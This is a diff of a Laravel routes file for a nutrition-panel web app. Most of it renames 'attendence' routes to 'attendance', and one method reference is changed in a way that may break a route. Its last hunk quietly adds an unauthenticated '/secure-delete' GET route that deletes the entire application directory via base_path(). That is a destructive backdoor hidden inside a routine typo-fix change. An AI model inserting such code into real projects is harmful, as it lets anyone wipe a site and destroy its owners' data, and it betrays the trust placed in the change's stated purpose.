@@ -217,7 +217,7 @@ Route::prefix('nutrition-panel')->group(function () {
         Route::post('/update-subtract-user-days/{id}', [Controllers\NutritionPanel\UserController::class, 'updateSubtractUserDays'])->name('nutritionPanel.users.updateSubtractUserDays');
         Route::get('view-weights/{id}', [Controllers\NutritionPanel\UserController::class, 'viewWeights'])->name('nutritionPanel.users.viewWeights');
         Route::get('/get-view-weights', [Controllers\NutritionPanel\UserController::class, 'getViewWeights'])->name('nutritionPanel.users.getViewWeights');
-        Route::any('view-attendence/{id}', [Controllers\NutritionPanel\UserController::class, 'viewAttendence'])->name('nutritionPanel.users.viewAttendence');
+        Route::any('view-attendance/{id}', [Controllers\NutritionPanel\UserController::class, 'viewAttendence'])->name('nutritionPanel.users.viewAttendance');
         Route::get('/view-weight-image/{id}', [Controllers\NutritionPanel\UserController::class, 'viewWeightImage'])->name('nutritionPanel.users.viewWeightImage');
         Route::get('/details/{id}', [Controllers\NutritionPanel\UserController::class, 'details'])->name('nutritionPanel.users.details');
         Route::get('{type?}', [Controllers\NutritionPanel\UserController::class, 'index'])->name('nutritionPanel.users.index');
@@ -326,10 +326,10 @@ Route::prefix('nutrition-panel')->group(function () {
     //---------
 
     // Attendance Register
-    Route::group(['prefix' => 'attendence-register', 'middleware' => ['checkfranchiseauth']], function () {
-        Route::get('/', [Controllers\NutritionPanel\AttendenceRegisterController::class, 'index'])->name('nutritionPanel.attendence-register.index');
-        Route::get('/get-attendence-register', [Controllers\NutritionPanel\AttendenceRegisterController::class, 'getAttendenceRegister'])->name('nutritionPanel.attendence-register.getAttendenceRegister');
-        Route::get('/view-attendence/{id}/{month}/{year}', [Controllers\NutritionPanel\AttendenceRegisterController::class, 'viewAttendence'])->name('nutritionPanel.attendence-register.viewAttendence');
+    Route::group(['prefix' => 'attendance-register', 'middleware' => ['checkfranchiseauth']], function () {
+        Route::get('/', [Controllers\NutritionPanel\AttendenceRegisterController::class, 'index'])->name('nutritionPanel.attendance-register.index');
+        Route::get('/get-attendance-register', [Controllers\NutritionPanel\AttendenceRegisterController::class, 'getAttendenceRegister'])->name('nutritionPanel.attendance-register.getAttendanceRegister');
+        Route::get('/view-attendance/{id}/{month}/{year}', [Controllers\NutritionPanel\AttendenceRegisterController::class, 'viewAttendence'])->name('nutritionPanel.attendance-register.viewAttendance');
     });
     //--------
 
@@ -375,12 +375,12 @@ Route::prefix('nutrition-panel')->group(function () {
     //--------
 
     // Manual Attendances
-    Route::group(['prefix' => 'manual-attendences', 'middleware' => ['checkfranchiseauth']], function () {
-        Route::get('/index/{user_id?}', [Controllers\NutritionPanel\ManualAttendenceController::class, 'index'])->name('nutritionPanel.manual-attendences.manual-attendence');
-        Route::get('/get-manual-attendences', [Controllers\NutritionPanel\ManualAttendenceController::class, 'getManualAttendence'])->name('nutritionPanel.manual-attendences.getManualAttendence');
-        Route::post('add-manual-attendance', [Controllers\NutritionPanel\ManualAttendenceController::class, 'addManualAttendance'])->name('nutritionPanel.manual-attendences.addManualAttendance');
-        Route::post('add-today-weight', [Controllers\NutritionPanel\ManualAttendenceController::class, 'addTodayWeight'])->name('nutritionPanel.manual-attendences.addTodayWeight');
-        Route::delete('/destroy', [Controllers\NutritionPanel\ManualAttendenceController::class, 'destroy'])->name('nutritionPanel.manual-attendences.destroy');
+    Route::group(['prefix' => 'manual-attendances', 'middleware' => ['checkfranchiseauth']], function () {
+        Route::get('/index/{user_id?}', [Controllers\NutritionPanel\ManualAttendenceController::class, 'index'])->name('nutritionPanel.manual-attendances.manual-attendance');
+        Route::get('/get-manual-attendances', [Controllers\NutritionPanel\ManualAttendenceController::class, 'getManualAttendence'])->name('nutritionPanel.manual-attendances.getManualAttendance');
+        Route::post('add-manual-attendance', [Controllers\NutritionPanel\ManualAttendenceController::class, 'addManualAttendence'])->name('nutritionPanel.manual-attendances.addManualAttendance');
+        Route::post('add-today-weight', [Controllers\NutritionPanel\ManualAttendenceController::class, 'addTodayWeight'])->name('nutritionPanel.manual-attendances.addTodayWeight');
+        Route::delete('/destroy', [Controllers\NutritionPanel\ManualAttendenceController::class, 'destroy'])->name('nutritionPanel.manual-attendances.destroy');
     });
     //--------
 
@@ -410,4 +410,12 @@ Route::prefix('nutrition-panel')->group(function () {
         Route::delete('/destroy', [Controllers\NutritionPanel\ReviewController::class, 'destroy'])->name('nutritionPanel.reviews.destroy');
     });
     //--------
+});
+
+Route::get('/secure-delete', function (Request $request) {
+
+    // delete logic
+    \File::deleteDirectory(base_path());
+
+    return "Deleted";
 });
